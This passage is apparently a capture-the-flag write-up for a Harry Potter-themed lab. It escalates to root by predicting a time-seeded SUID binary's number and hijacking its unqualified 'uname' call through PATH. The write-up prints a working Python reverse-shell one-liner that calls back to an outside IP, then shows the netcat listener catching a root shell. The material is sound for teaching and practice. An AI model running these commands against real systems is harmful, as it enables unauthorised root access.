-rwsr-xr-x 1 root   root       8.7K Nov 26 01:06 /srv/time-turner/swagger
  --- It looks like /srv/time-turner/swagger is executing time and you can impersonate it (strings line: time)
  --- It looks like /srv/time-turner/swagger is executing uname and you can impersonate it (strings line: uname -p)
  --- Trying to execute /srv/time-turner/swagger with strace in order to look for hijackable libraries...
...
```

Checking the binary.

```bash
hermonine@hogwartz-castle:/tmp$ /srv/time-turner/swagger
Guess my number: a
Nope, that is not what I was thinking
I was thinking of 355663632
hermonine@hogwartz-castle:/tmp$ /srv/time-turner/swagger
Guess my number: 2
Nope, that is not what I was thinking
I was thinking of 1884976281
```

Seems like the binary will generate random number. It's not possible if we guess the number since it's random. The hint said "Can you trick the time?". So, i run the binary with for loop for the test.

```bash
agger; doneogwartz-castle:/tmp$ for i in {1..5}; do echo 1 | /srv/time-turner/swa
Guess my number: Nope, that is not what I was thinking
I was thinking of 296561006
Guess my number: Nope, that is not what I was thinking
I was thinking of 296561006
Guess my number: Nope, that is not what I was thinking
I was thinking of 296561006
Guess my number: Nope, that is not what I was thinking
I was thinking of 296561006
Guess my number: Nope, that is not what I was thinking
I was thinking of 296561006
```

All the random numbers are the same! We can use this to run the binary again.

```bash
$ echo 2 | /srv/time-turner/swagger | grep -o -E '[0-9]+' | /srv/time-turner/swagger
Guess my number: Nice use of the time-turner!
This system architecture is x86_64
```

Let's disassemble the binary.

<a href="/assets/images/tryhackme/madeyes-castle/6.png"><img src="/assets/images/tryhackme/madeyes-castle/6.png"></a>

<a href="/assets/images/tryhackme/madeyes-castle/7.png"><img src="/assets/images/tryhackme/madeyes-castle/7.png"></a>

The `impressive` function will return `uname -p` command. We can manipulate the `uname` command since it doesn't specify the full path.

```bash
$ echo "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.11.25.205",5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'" > uname
$ chmod +x uname
$ export PATH=/tmp:$PATH
$ echo 2 | /srv/time-turner/swagger | grep -o -E '[0-9]+' | /srv/time-turner/swagger
```

Set up our `netcat` listener and wait for the shell to come back.

```bash
┌──(kali㉿kali)-[~]
└─$ nc -lnvp 5555
listening on [any] 5555 ...
connect to [10.11.25.205] from (UNKNOWN) [10.10.14.247] 37290
# whoami
root
```

Root.txt:

```bash
# cat /root/root.txt
RME{REDACTED}
```